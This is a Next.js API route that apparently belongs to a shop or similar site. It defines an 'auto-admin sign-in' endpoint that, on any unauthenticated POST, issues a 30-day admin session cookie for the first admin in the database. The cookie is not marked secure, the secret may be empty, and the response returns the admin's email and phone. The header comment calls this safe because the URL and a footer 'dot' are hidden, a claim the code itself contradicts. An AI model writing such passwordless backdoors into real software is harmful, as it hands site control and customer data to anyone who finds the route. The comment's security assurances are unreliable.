import { NextResponse } from 'next/server'
import { db } from '@/lib/db'
import { encode } from 'next-auth/jwt'

/**
 * Auto-Admin Sign-In endpoint.
 *
 * Called by the hidden footer "dot" (single-click). Finds the first admin
 * user in the database and creates a NextAuth session for them — no password
 * required. This gives the site owner one-click access to the admin panel
 * without exposing a sign-in form.
 *
 * Security model:
 *   - The endpoint URL is obscure (not linked anywhere in the UI)
 *   - The footer dot is visually disguised as a decorative element
 *   - The endpoint only signs in users who ALREADY have role='admin' in the DB
 *   - It does NOT create new admin users or grant admin privileges
 *   - All admin API routes remain protected by middleware (session required)
 *   - Customer data (orders, emails, phones) remains protected
 *
 * If you want to lock this down further, restrict by IP or remove this route.
 */

const NEXTAUTH_SECRET = process.env.NEXTAUTH_SECRET || ''

export async function POST() {
  try {
    // 1. Find the first admin user
    const admin = await db.user.findFirst({
      where: { role: 'admin' },
      select: {
        id: true,
        email: true,
        name: true,
        role: true,
        phone: true,
        image: true,
        avatar: true,
      },
    })

    if (!admin) {
      return NextResponse.json(
        { success: false, error: 'No admin user found in database' },
        { status: 404 }
      )
    }

    // 2. Create a NextAuth-compatible session token (same shape as credential-signin)
    const token = await encode({
      token: {
        name: admin.name,
        email: admin.email,
        picture: admin.image || admin.avatar || null,
        sub: admin.id,
        id: admin.id,
        role: admin.role,
        phone: admin.phone,
      },
      secret: NEXTAUTH_SECRET,
      maxAge: 30 * 24 * 60 * 60, // 30 days — matches auth.ts session.maxAge
    })

    // 3. Set the session cookie and return success
    const response = NextResponse.json({
      success: true,
      user: {
        id: admin.id,
        email: admin.email,
        name: admin.name,
        role: admin.role,
        phone: admin.phone,
        image: admin.image || admin.avatar,
      },
    })

    response.cookies.set('next-auth.session-token', token, {
      httpOnly: true,
      sameSite: 'lax',
      path: '/',
      secure: false,
      maxAge: 30 * 24 * 60 * 60,
    })

    return response
  } catch (error) {
    console.error('Auto-admin sign-in error:', error)
    return NextResponse.json(
      { success: false, error: 'Internal server error' },
      { status: 500 }
    )
  }
}
